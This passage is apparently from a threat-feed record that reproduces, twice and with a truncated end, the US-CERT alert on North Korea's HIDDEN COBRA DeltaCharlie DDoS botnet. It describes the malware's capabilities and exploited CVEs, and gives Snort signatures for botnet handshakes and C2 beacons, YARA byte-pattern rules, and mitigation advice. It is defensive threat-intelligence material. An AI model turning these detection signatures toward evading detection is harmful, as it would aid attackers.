Blockbuster Destructive Malware report should be viewed in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert. DeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Carrier Grade NAT (CGN) attacks. The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks. Further details on the malware can be found in Novetta’s report available at the following URL:</p><p><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf</a></p><p><strong><em>Detection and Response</em></strong></p><p>HIDDEN COBRA IOCs related to DeltaCharlie are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find that some traffic corresponds to malicious activity and some to legitimate activity. System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors. Additionally, the appendices of this report provide network signatures to aid in the detection and mitigation of HIDDEN COBRA activity.</p><p><strong><em>Network Signatures and Host-Based Rules</em></strong></p><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><p><strong><em>Network Signatures</em></strong></p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_DDoS_HANDSHAKE_SUCCESS\"; dsize:6; flow:established,to_server; content:\"|18 17 e9 e9 e9 e9|\"; fast_pattern:only; sid:1; rev:1;)</p><p>________________________________________________________________</p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_Botnet_C2_Host_Beacon\"; flow:established,to_server; content:\"|1b 17 e9 e9 e9 e9|\"; depth:6; fast_pattern; sid:1; rev:1;)</p><p>________________________________________________________________</p><p><strong><em>YARA Rules</em></strong></p><p>{</p><p>meta:</p><p>description = “RSA Key”</p><p>strings:</p><p>$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94</p><p>A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77</p><p>48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39</p><p>73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2</p><p>AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED</p><p>39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68</p><p>3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13</p><p>B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}</p><p>condition:</p><p>any of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Misspelled Strings”</p><p>strings:</p><p>$STR1 = \"Wating\" wide ascii</p><p>$STR2 = \"Reamin\" wide ascii</p><p>$STR3 = \"laptos\" wide ascii</p><p>condition:</p><p>(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Random URL Builder”</p><p>strings:</p><p>$randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 }</p><p>condition:</p><p>$randomUrlBuilder</p><div><div id=\"ftn1\"><div><div id=\"ftn1\"><p>}</p><p>________________________________________________________________</p></div><div id=\"ftn2\"> </div></div></div></div>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p><strong><em>Mitigation Strategies</em></strong></p><p>Network administrators are encouraged to apply the following recommendations, which can prevent as many as 85 percent of targeted cyber intrusions. The mitigation strategies provided may seem like common sense. However, many organizations fail to use these basic security measures, leaving their systems open to compromise:</p><ol><li><strong>Patch applications and operating systems</strong> – Most attackers target vulnerable applications and operating systems. Ensuring that applications and operating systems are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Use best practices when updating software and patches by only downloading updates from authenticated vendor sites.</li><li><strong>Use application whitelisting</strong> – Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software.</li><li><strong>Restrict administrative privileges</strong> – Threat actors are increasingly focused on gaining control of legitimate credentials, especially credentials associated with highly privileged accounts. Reduce privileges to only those needed for a user’s duties. Separate administrators into privilege tiers with limited access to other tiers.</li><li><strong>Segment networks and segregate them into security zones</strong> – Segment networks into logical enclaves and restrict host-to-host communications paths. This helps protect sensitive information and critical services, and limits damage from network perimeter breaches.</li><li><strong>Validate input</strong> – Input validation is a method of sanitizing untrusted input provided by users of a web application. Implementing input validation can protect against the security flaws of web applications by significantly reducing the probability of successful exploitation. Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.</li><li><strong>Use stringent file reputation settings</strong> – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible. Some anti-virus products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy code from gaining control.</li><li><strong>Understand firewalls</strong> – Firewalls provide security to make your network less susceptible to attack. They can be configured to block data and applications from certain locations (IP whitelisting), while allowing relevant and necessary data through.</li></ol><p><strong><em>Response to Unauthorized Network Access</em></strong></p><p><strong>Enforce your security incident response and business continuity plan.</strong> It may take time for your organization’s IT professionals to isolate and remove threats to your systems and restore normal operations. Meanwhile, you should take steps to maintain your organization’s essential functions according to your business continuity plan. Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures.</p><p><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).</p><p><strong><em>Protect Against SQL Injection and Other Attacks on Web Services</em></strong></p><p>To protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities. They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.</p><ul><li>Use and configure available firewalls to block attacks.</li><li>Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.</li><li>Monitor and remove any unauthorized code present in any www directories.</li><li>Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.</li><li>Remove unnecessary HTTP verbs from web servers. Typical web servers and applications only require GET, POST, and HEAD.</li><li>Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.</li><li>Secure both the operating system and the application.</li><li>Update and patch production servers regularly.</li><li>Disable potentially harmful SQL-stored procedure calls.</li><li>Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.</li><li>Consider using type-safe stored procedures and prepared statements.</li><li>Audit transaction logs regularly for suspicious activity.</li><li>Perform penetration testing on web services.</li><li>Ensure error messages are generic and do not expose too much information.</li></ul><p><strong><em>Permissions, Privileges, and Access Controls</em></strong></p><p>System operators should take the following steps to limit permissions, privileges, and access controls.</p><ul><li>Reduce privileges to only those needed for a user’s duties.</li><li>Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Carefully consider the risks before granting administrative rights to users on their own machines.</li><li>Scrub and verify all administrator accounts regularly.</li><li>Configure Group Policy to restrict all users to only one login session, where possible.</li><li>Enforce secure network authentication, where possible.</li><li>Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.</li><li>Segment networks into logical enclaves and restrict host-to-host communication paths. Containment provided by enclaving also makes incident cleanup significantly less costly.</li><li>Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.</li><li>Audit existing firewall rules and close all ports that are not explicitly needed for business. Specifically, carefully consider which ports should be connecting outbound versus inbound.</li><li>Enforce a strict lockout policy for network users and closely monitor logs for failed login activity. Failed login activity can be indicative of failed intrusion activity.</li><li>If remote access between zones is an unavoidable business need, log and monitor these connections closely.</li><li>In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens.</li></ul><p><strong><em>Logging Practices</em></strong></p><p>System operators should follow these secure logging practices.</p><ul><li>Ensure event logging, including applications, events, login activities, and security attributes, is turned on or monitored for identification of security issues.</li><li>Configure network logs to provide adequate information to assist in quickly developing an accurate determination of a security incident.</li><li>Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.</li><li>Secure logs in a centralized location and protect them from modification.</li><li>Prepare an incident response plan that can be rapidly administered in case of a cyber intrusion.</li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1] IBM. Actor Lazarus Group – Blog Post by IBM X-Force Exchange.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2] AlienVault. Operation Blockbuster Unveils the Actors Behind the Sony Attacks.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3] Symantec. Destover: Destructive Malware has links back to attacks on South Korea.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4] Symantec. Duuzer back door Trojan targets South Korea to take over computers.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5] FireEye. Zero-Day HWP Exploit.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6] US-CERT. Alert (TA14-353A) Targeted Destructive Malware. Original Release Date: 12/19/2014 | Last revised: 9/30/2016</a></li>\n\t\t\t\t\t<li><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7] Novetta. Operation Blockbuster Destructive Malware Report.</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>June 13, 2017: Initial Release</li>\n\t\t\t\t\t\t<li>August 23, 2017: Updated YARA Rules and included MAR-10132963 (.pdf and .stix files)</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "9044 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-164A",
					"source_name": "open source",
					"description": "Original release date: June 13, 2017 | Last revised: August 23, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Networked Systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides technical details on the tools and infrastructure used by cyber actors of the North Korean government to target the media, aerospace, financial, and critical infrastructure sectors in the United States and globally. Working with U.S. Government partners, DHS and FBI identified Internet Protocol (IP) addresses associated with a malware variant, known as DeltaCharlie, used to manage North Korea’s distributed denial-of-service (DDoS) botnet infrastructure. This alert contains indicators of compromise (IOCs), malware descriptions, network signatures, and host-based rules to help network defenders detect activity conducted by the North Korean government. The U.S. Government refers to the malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information related to HIDDEN COBRA activity, go to <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation. This alert identifies IP addresses linked to systems infected with DeltaCharlie malware and provides descriptions of the malware and associated malware signatures. DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network. FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.</p><p>This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S. Government.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_csv.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_stix.xml\">.stix</a>)</li></ul><p>On August 23, 2017, DHS published a Malware Analysis Report (MAR-10132963) that examines malware functionality to provide detailed code analysis and insight into specific tactics, techniques, and procedures (TTPs) observed in the malware.</p><p>For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963_stix.xml\">.stix</a>)</li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature. Commercial reporting has referred to this activity as Lazarus Group<a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1]</a> and Guardians of Peace.<a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2]</a> DHS and FBI assess that HIDDEN COBRA actors will continue to use cyber operations to advance their government’s military and strategic objectives. Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.</p><p>Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover,<a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3]</a> Wild Positron/Duuzer,<a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4]</a> and Hangman.<a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5]</a> DHS has previously released Alert TA14-353A,<a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6]</a> which contains additional details on the use of a server message block (SMB) worm tool employed by these actors. Further research is needed to understand the full breadth of this group’s cyber capabilities. In particular, DHS recommends that more research should be conducted on the North Korean cyber activity that has been reported by cybersecurity and threat research firms.</p><p>HIDDEN COBRA actors commonly target systems running older, unsupported versions of Microsoft operating systems. The multiple vulnerabilities in these older systems provide cyber actors many targets for exploitation. These actors have also used Adobe Flash player vulnerabilities to gain initial entry into users’ environments.</p><p>HIDDEN COBRA is known to use vulnerabilities affecting various applications. These vulnerabilities include:</p><ul><li>CVE-2015-6585: Hangul Word Processor Vulnerability</li><li>CVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x Vulnerability</li><li>CVE-2016-0034: Microsoft Silverlight 5.1.41212.0 Vulnerability</li><li>CVE-2016-1019: Adobe Flash Player 21.0.0.197 Vulnerability</li><li>CVE-2016-4117: Adobe Flash Player 21.0.0.226 Vulnerability</li></ul><p>DHS recommends that organizations upgrade these applications to the latest version and patch level. If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.</p><p>The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie. The DeltaCharlie DDoS bot was originally reported by Novetta in their 2016 Operation Blockbuster Malware Report.<a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7]</a> This malware has used the IP addresses identified in the accompanying .csv and .stix files as both source and destination IPs. In some instances, the malware may have been present on victims’ networks for a significant period.</p><p><strong><em>Technical Details</em></strong></p><p>DeltaCharlie is a DDoS tool used by HIDDEN COBRA actors, and is referenced and detailed in Novetta’s Operation Blockbuster Destructive Malware report. The information related to DeltaCharlie from the Operation Blockbuster Destructive Malware report should be viewed in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert. DeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Carrier Grade NAT (CGN) attacks. The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks. Further details on the malware can be found in Novetta’s report available at the following URL:</p><p><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf</a></p><p><strong><em>Detection and Response</em></strong></p><p>HIDDEN COBRA IOCs related to DeltaCharlie are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find that some traffic corresponds to malicious activity and some to legitimate activity. System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors. Additionally, the appendices of this report provide network signatures to aid in the detection and mitigation of HIDDEN COBRA activity.</p><p><strong><em>Network Signatures and Host-Based Rules</em></strong></p><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><p><strong><em>Network Signatures</em></strong></p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_DDoS_HANDSHAKE_SUCCESS\"; dsize:6; flow:established,to_server; content:\"|18 17 e9 e9 e9 e9|\"; fast_pattern:only; sid:1; rev:1;)</p><p>________________________________________________________________</p><p>alert tcp any any -&gt; any any (msg:\"DPRK_HIDDEN_COBRA_Botnet_C2_Host_Beacon\"; flow:established,to_server; content:\"|1b 17 e9 e9 e9 e9|\"; depth:6; fast_pattern; sid:1; rev:1;)</p><p>________________________________________________________________</p><p><strong><em>YARA Rules</em></strong></p><p>{</p><p>meta:</p><p>description = “RSA Key”</p><p>strings:</p><p>$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94</p><p>A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77</p><p>48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39</p><p>73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2</p><p>AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED</p><p>39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68</p><p>3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13</p><p>B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}</p><p>condition:</p><p>any of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Misspelled Strings”</p><p>strings:</p><p>$STR1 = \"Wating\" wide ascii</p><p>$STR2 = \"Reamin\" wide ascii</p><p>$STR3 = \"laptos\" wide ascii</p><p>condition:</p><p>(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them</p><p>}</p><p>________________________________________________________________</p><p>{</p><p>meta:</p><p>description = “DDoS Random URL Builder”</p><p>strings:</p><p>$randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 }</p><p>condition:</p><p>$randomUrlBuilder</p><div><div id=\"ftn1\"><div><div id=\"ftn1\"><p>}</p><p>________________________________________________________________</p></div><div id=\"ftn2\"> </div></div></div></div>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p><strong><em>Mitigation Strategies</em></strong></p><p>Network administrators are encouraged to apply the following recommendations, which can prevent as many as 85 percent of targeted cyber intrusions. The mitigation strategies provided may seem like common sense. However, many organizations fail to use these basic security measures, leaving their systems open to compromise:</p><ol><li><strong>Patch applications and operating systems</strong> – Most attackers target vulnerable applications and operating systems. Ensuring that applications and operating systems are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Use best practices when updating software and patches by only downloading updates from authenticated vendor sites.</li><li><strong>Use application whitelisting</strong> – Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software.</li><li><strong>Restrict administrative privileges</strong> – Threat actors are increasingly focused on gaining control of legitimate credentials, especially credentials associated with highly privileged accounts. Reduce privileges to only those needed for a user’s duties. Separate administrators into privilege tiers with limited access to other tiers.</li><li><strong>Segment networks and segregate them into security zones</strong> – Segment networks into logical enclaves and restrict host-to-host communications paths. This helps protect sensitive information and critical services, and limits damage from network perimeter breaches.</li><li><strong>Validate input</strong> – Input validation is a method of sanitizing untrusted input provided by users of a web application. Implementing input validation can protect against the security flaws of web applications by significantly reducing the probability of successful exploitation. Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.</li><li><strong>Use stringent file reputation settings</strong> – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible. Some anti-virus products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy code from gaining control.</li><li><strong>Understand firewalls</strong> – Firewalls provide security to make your network less susceptible to attack. They can be configured to block data and applications from certain locations (IP whitelisting), while allowing relevant and necessary data through.</li></ol><p><strong><em>Response to Unauthorized Network Access</em></strong></p><p><strong>Enforce your security incident response and business continuity plan.</strong> It may take time for your organization’s IT professionals to isolate and remove threats to your systems and restore normal operations. Meanwhile, you should take steps to maintain your organization’s essential functions according to your business continuity plan. Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures.</p><p><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).</p><p><strong><em>Protect Against SQL Injection and Other Attacks on Web Services</em></strong></p><p>To protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities. They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.</p><ul><li>Use and configure available firewalls to block attacks.</li><li>Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.</li><li>Monitor and remove any unauthorized code present in any www directories.</li><li>Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.</li><li>Remove unnecessary HTTP verbs from web servers. Typical web servers and applications only require GET, POST, and HEAD.</li><li>Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.</li><li>Secure both the operating system and the application.</li><li>Update and patch production servers regularly.</li><li>Disable potentially harmful SQL-stored procedure calls.</li><li>Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.</li><li>Consider using type-safe stored procedures and prepared statements.</li><li>Audit transaction logs regularly for suspicious activity.</li><li>Perform penetration testing on web services.</li><li>Ensure error messages are generic and do not expose too much information.</li></ul><p><strong><em>Permissions, Privileges, and Access Controls</em></strong></p><p>System operators should take the following steps to limit permissions, privileges, and access controls.</p><ul><li>Reduce privileges to only those needed for a user’s duties.</li><li>Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Carefully consider the risks before granting administrative rights to users on their own machines.</li><li>Scrub and verify all administrator accounts regularly.</li><li>Configure Group Policy to restrict all users to only one login session, where possible.</li><li>Enforce secure network authentication, where possible.</li><li>Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.</li><li>Segment networks into logical enclaves and restrict host-to-host communication paths. Containment provided by enclaving also makes incident cleanup significantly less costly.</li><li>Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower 